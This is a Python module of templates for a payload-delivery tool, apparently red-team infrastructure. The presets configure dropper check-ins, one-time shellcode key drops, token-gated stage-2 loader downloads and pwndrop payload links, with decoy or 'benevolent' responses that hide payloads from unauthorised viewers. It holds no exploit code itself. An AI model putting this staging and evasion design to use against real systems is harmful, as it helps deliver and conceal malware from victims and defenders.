"""Built-in deployment templates: fill-in-the-blank link presets.

Each template provides DeliveryLink defaults keyed by the same field names the
form/API accept. Placeholders use the {placeholder} convention; the operator
replaces them at creation time.
"""

LINK_TEMPLATES = {
    "dropper-checkin": {
        "label": "Dropper check-in",
        "description": "Encrypted environment package from a dropper; operator reviews hostname/screenshot before anything is released.",
        "defaults": {
            "kind": "key", "key_text": "{second-stage trigger key}",
            "gate_type": "submission", "cipher": "aes256",
            "cipher_key": "{32-byte hex key}", "cipher_iv": "{16-byte hex iv}",
            "expected_fields": ["hostname", "username"],
            "requires_approval": True, "placeholder": "blank", "on_deny": "benevolent",
            "benevolent_text": "{clean exit response}",
        },
    },
    "key-drop-one-time": {
        "label": "One-time key drop",
        "description": "Single-retrieval key distribution (e.g. shellcode decryption key). Time-limited, one shot, gone.",
        "defaults": {
            "kind": "key", "key_text": "{key material}",
            "gate_type": "totp", "totp_secret": "{shared secret}", "totp_window": 30,
            "one_time": True, "expires_at": "{ISO datetime}",
            "placeholder": "blank", "on_deny": "not_found",
        },
    },
    "loader-stage": {
        "description": "Loader fetches its stage-2 through a token-gated URL with a benevolent fallback.",
        "label": "Loader stage",
        "defaults": {
            "kind": "file", "gate_type": "token", "gate_token": "{random token}",
            "placeholder": "blank", "on_deny": "benevolent",
            "benevolent_text": "{clean exit response}",
            "one_time": False, "max_uses": 5,
        },
    },
    "file-drop": {
        "label": "Time-boxed file drop",
        "description": "pwndrop-backed payload with a use count and expiry; watermark enabled for leak tracing.",
        "defaults": {
            "kind": "proxy", "pwndrop_url": "{pwndrop file URL}",
            "gate_type": "token", "gate_token": "{random token}",
            "max_uses": 10, "watermark": True,
            "placeholder": "placeholder", "on_deny": "decoy",
        },
    },
}


def get_templates():
    """Built-in templates overlaid with ./data/templates/links/*.json.

    A file with the same key overrides the built-in; new keys extend the
    picker. Invalid JSON files are skipped silently (the form never breaks).
    """
    import json
    templates = dict(LINK_TEMPLATES)
    from . import library
    for name in library.list_template_files("links", ".json"):
        raw = library.read_template_file("links", name, ".json")
        if raw is None:
            continue
        try:
            entry = json.loads(raw)
        except json.JSONDecodeError:
            continue
        if isinstance(entry, dict) and isinstance(entry.get("defaults"), dict):
            templates[name[:-5]] = {
                "label": str(entry.get("label") or name[:-5])[:80],
                "description": str(entry.get("description", ""))[:300],
                "defaults": entry["defaults"],
            }
    return templates
